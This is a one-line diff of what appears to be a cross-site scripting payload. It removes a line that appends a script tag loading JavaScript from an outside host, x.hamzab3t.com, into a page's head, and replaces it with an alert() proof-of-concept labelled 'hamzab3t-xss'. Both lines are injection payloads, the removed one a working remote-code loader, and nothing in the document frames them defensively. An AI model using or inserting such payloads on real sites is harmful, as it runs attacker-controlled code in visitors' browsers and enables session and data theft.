@@ -1,1 +1,1 @@
-document.head.appendChild(Object.assign(document.createElement('script'),{src:'//x.hamzab3t.com'}));
+alert('hamzab3t-xss')
